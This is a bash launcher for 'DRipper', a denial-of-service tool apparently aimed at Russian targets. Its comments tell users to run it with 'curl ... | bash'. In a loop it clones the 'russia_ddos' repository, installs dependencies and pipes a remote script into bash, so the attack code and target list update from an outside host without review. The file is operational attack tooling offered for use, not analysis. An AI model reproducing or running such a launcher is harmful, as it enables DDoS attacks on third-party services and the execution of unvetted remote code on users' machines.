##### This script will start and manage DRipper_main script
##### Advantages of launching DRipper_main indirectly via this script is DRipper_main can be still modified on the fly,
##### and all code updates, including list of targets will update automatically without user interaction after every relaunch (default 30 min)

##### To stop this script press CTRL+C several times

##### Use next command in local linux terminal to run this script. #####
# >>>     curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_init | bash    <<<


#!/bin/bash
# DRipper_main restart time in seconds
restart_time=60

# Install git
if [ ! -f /usr/bin/git ]; then
   sudo apt install git
fi

while true
do
   
   # Install latest version of DDripper
   cd ~
   rm -rf russia_ddos
   git clone https://github.com/alexmon1989/russia_ddos.git
   cd russia_ddos
   pip install -r requirements.txt

   # Run main script
   curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_main | bash

   # Restart DRipper_main after restart_time seconds (default 1800s == 30m)
   sleep $restart_time
   
   pkill -f DRipper.py
   #pkill -9 python; pkill -9 python3
done




#kill_list=`ps -aux | grep DRipper.py | grep -v grep | awk '{ print $2 }'`
#for i in kill_list
#do
#pkill $i
#done
#killall `ps -aux | grep DRipper.py | grep -v grep | awk '{ print $2 }'` && killall inotifywait
